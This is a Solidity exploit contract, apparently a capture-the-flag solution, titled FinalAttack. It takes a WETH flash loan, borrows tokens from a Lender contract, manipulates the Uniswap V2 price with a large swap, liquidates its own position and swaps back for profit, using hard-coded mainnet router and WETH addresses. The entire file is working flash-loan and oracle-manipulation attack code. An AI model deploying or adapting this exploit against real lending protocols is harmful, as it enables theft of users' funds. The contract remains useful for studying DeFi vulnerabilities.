pragma solidity 0.8.0;

import "./Setup.sol";
import "./Lender.sol";
import "../interfaces/IUniswapV2Router02.sol";

contract FinalAttack {
    address flashloanPoolAddress;
    address lenderAddress;
    address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address weth9Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address tokenAddress;
    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Factory public constant factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    Token public token;
    IUniswapV2Pair public pair;
    Lender public lender;
    
    FlashLoan public flashloanPool; 

    constructor(address _token, address _pair, address _lender, address _flashloanPool) {
        lenderAddress = _lender;
        tokenAddress = _token;
        
        token = Token(_token);
        pair = IUniswapV2Pair(_pair);
        lender = Lender(_lender);
        flashloanPoolAddress = _flashloanPool;
        flashloanPool = FlashLoan(_flashloanPool);
    }

    function receiveFlashLoan(uint256 amount) public {
        attack();

        // repay money
        weth.transfer(flashloanPoolAddress, amount);
    }

    function getFlashloanPoolWethBalance() public returns (uint) {
        return weth.balanceOf(address(flashloanPool));
    }

    function toFlashLoan() public {
        // to flash loan 130 ether weth
        flashloanPool.flashLoan(130 ether);
    }

    function attack() public {
        // deposit 1 ether weth to lender for token
        uint borrowToken = 13333 ether;

        uint depositWeth = 1 ether;
        weth.approve(lenderAddress, depositWeth);  // approve
        lender.deposit(depositWeth);
        
        lender.borrow(borrowToken);
        
        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);
        
        // first swap
        uint swapWeth = 129 ether;
        weth.approve(routerAddress, swapWeth);
        address[] memory path;
        path = new address[](2);
        path[0] = weth9Address;
        path[1] = tokenAddress;
        router.swapExactTokensForTokens(swapWeth, 0, path, address(this), 1698467488);
        
        // call liquidate()
        token.approve(lenderAddress, borrowToken);
        lender.liquidate(address(this), borrowToken);
        
        // last swap
        // token.approve(routerAddress, type(uint256).max);
        uint hackerTokenBalance = token.balanceOf(address(this));
        // path[0] = tokenAddress;
        // path[1] = weth9Address;
        // router.swapExactTokensForTokens(hackerTokenBalance - 1 ether, 0, path, address(this), 1698467488);
        swapTokenForWeth(hackerTokenBalance);
    }

    function getToken() public {
        uint borrowToken = 50000 ether;
        uint depositWeth = 150 ether;
        weth.approve(lenderAddress, depositWeth);  // approve
        lender.deposit(depositWeth);
        
        lender.borrow(borrowToken);
    }

    function swapWethForToken() public {
        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);

        // weth.approve(routerAddress, type(uint256).max);
        // uint toSwapWeth = 1 ether;
        // address[] memory path2 = new address[](2);
        // path2[0] = weth9Address;
        // path2[1] = tokenAddress;
        // router.swapExactTokensForTokens(toSwapWeth, 0, path2, address(this), 1698467488);
        address[] memory path = new address[](2);
        path[0] = weth9Address;
        path[1] = tokenAddress;
        uint[] memory amounts = router.getAmountsOut(1 ether, path);
        weth.transfer(address(pair), 1 ether);
        pair.swap(amounts[1], 0, address(this), "");
    }

    function swapTokenForWeth(uint amount) public {
        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);

        // token.approve(routerAddress, type(uint256).max);
        // uint toSwapToken = 30000 ether;
        // address[] memory path = new address[](2);
        // path[0] = tokenAddress;
        // path[1] = weth9Address;
        // router.swapExactTokensForTokens(toSwapToken, 0, path, address(this), 1698467488);
        address[] memory path = new address[](2);
        path[1] = weth9Address;
        path[0] = tokenAddress;
        uint[] memory amounts = router.getAmountsOut(amount, path);
        token.transfer(address(pair), amount);
        pair.swap(0, amounts[1], address(this), "");
    }

    function lastSwap() public {
        // last swap
        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);
        address[] memory path2 = new address[](2);
        token.approve(routerAddress, type(uint256).max);
        uint hackerTokenBalance = 200000 ether;
        // uint hackerTokenBalance = token.balanceOf(address(this));
        path2[0] = tokenAddress;
        path2[1] = weth9Address;
        router.swapExactTokensForTokens(hackerTokenBalance, 0, path2, address(this), 1698467488);
    }
}